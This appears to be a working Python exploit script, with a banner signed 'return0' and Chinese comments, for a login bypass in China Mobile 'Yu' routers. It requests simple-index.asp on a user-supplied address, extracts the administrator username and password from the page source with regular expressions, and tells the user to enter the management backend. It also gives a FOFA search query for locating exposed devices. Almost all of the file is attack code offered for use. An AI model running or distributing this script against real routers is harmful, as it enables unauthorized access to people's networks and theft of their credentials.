print("""           .---.               ___                ,---,        ,---,                          
          /. ./|             ,--.'|_            ,--.' |      .'  .' `\                        
      .--'.  ' ;             |  | :,'           |  |  :    ,---.'     \    ,---.              
     /__./ \ : |             :  : ' :           :  :  :    |   |  .`\  |  '   ,'\   ,----._,. 
 .--'.  '   \' .  ,--.--.  .;__,'  /     ,---.  :  |  |,--.:   : |  '  | /   /   | /   /  ' / 
/___/ \ |    ' ' /       \ |  |   |     /     \ |  :  '   ||   ' '  ;  :.   ; ,. :|   :     | 
;   \  \;      :.--.  .-. |:__,'| :    /    / ' |  |   /' :'   | ;  .  |'   | |: :|   | .\  . 
 \   ;  `      | \__\/: . .  '  : |__ .    ' /  '  :  | | ||   | :  |  ''   | .; :.   ; ';  | 
  .   \    .\  ; ," .--.; |  |  | '.'|'   ; :__ |  |  ' | :'   : | /  ; |   :    |'   .   . | 
   \   \   ' \ |/  /  ,.  |  ;  :    ;'   | '.'||  :  :_:,'|   | '` ,/   \   \  /  `---`-'| | 
    :   '  |--";  :   .'   \ |  ,   / |   :    :|  | ,'    ;   :  .'      `----'   .'__/\_: | 
     \   \ ;   |  ,     .-./  ---`-'   \   \  / `--''      |   ,.'                 |   :    : 
      '---"     `--`---'                `----'             '---'                    \   \  /  
                                                                                     `--`-'  by:return0""")
#使用的库
import requests
import sys
import re

#漏洞信息答应
def vul_message():
    print("漏洞描述：中国移动 禹路由 simple-index.asp 存在登录绕过，可以查看wifi信息")
    print("漏洞影响:中国移动 禹路由")
    print('fofa语法：title="互联世界 物联未来-登录"')
    print('发出日期：2021.7.5')

#主函数，漏洞验证及测试代码
def main():
    
    user_enter = input("请输入中国移动禹路由url地址(请添加协议仅包含域名及端口，80端口可忽略列入：http://www.baidu.com):")
    url = str(user_enter+"/simple-index.asp")
    headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE','X-Forwarded-For':'8.8.8.8', 'content-type':'application/json'
}
    try:
        r = requests.get(url,timeout=10,headers=headers)
        r.encoding = 'UTF-8'
        if r.status_code!=200:
            print("*页面响应失败，请查看该页面是否可以正常访问！*")
        else:
            print("*页面响应正常*")
    except:
        print("发生异常，请检查url输入是否正确")
        sys.exit()

    #使用正则表达式pattern为正则表达式
    pattern = re.compile(r'var\s+newPD\s+=\s+\"(\S+)\";')
    #findall括号中的内容为被正则表达式匹配的文本数据
    result_password = pattern.findall(r.text)
    pattern2 = re.compile(r'var\s+newUN\s+=\s+\"(\S+)\";')
    result_username = pattern2.findall(r.text)
    print("账号为："+result_username[0])
    print("密码为："+result_password[0])
    print("*获取完毕，请输入账号密码进入管理后台")
    
if __name__ == "__main__":
    vul_message()
    main()